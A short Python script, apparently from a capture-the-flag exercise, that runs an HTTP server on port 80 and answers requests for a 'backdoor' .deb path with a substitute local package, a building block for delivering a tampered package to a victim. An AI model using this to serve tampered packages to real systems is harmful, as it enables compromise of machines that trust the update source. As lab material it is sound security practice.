#!/usr/bin/python3
import http.server
import socketserver

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/pub/jfrost/backdoor/suriv_amd64.deb':
            self.path = '/home/guest/debs/golang-github-huandu-xstrings-dev_1.2.1-1_all.deb'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

my_server = socketserver.TCPServer(('', 80), MyHttpRequestHandler)
my_server.serve_forever()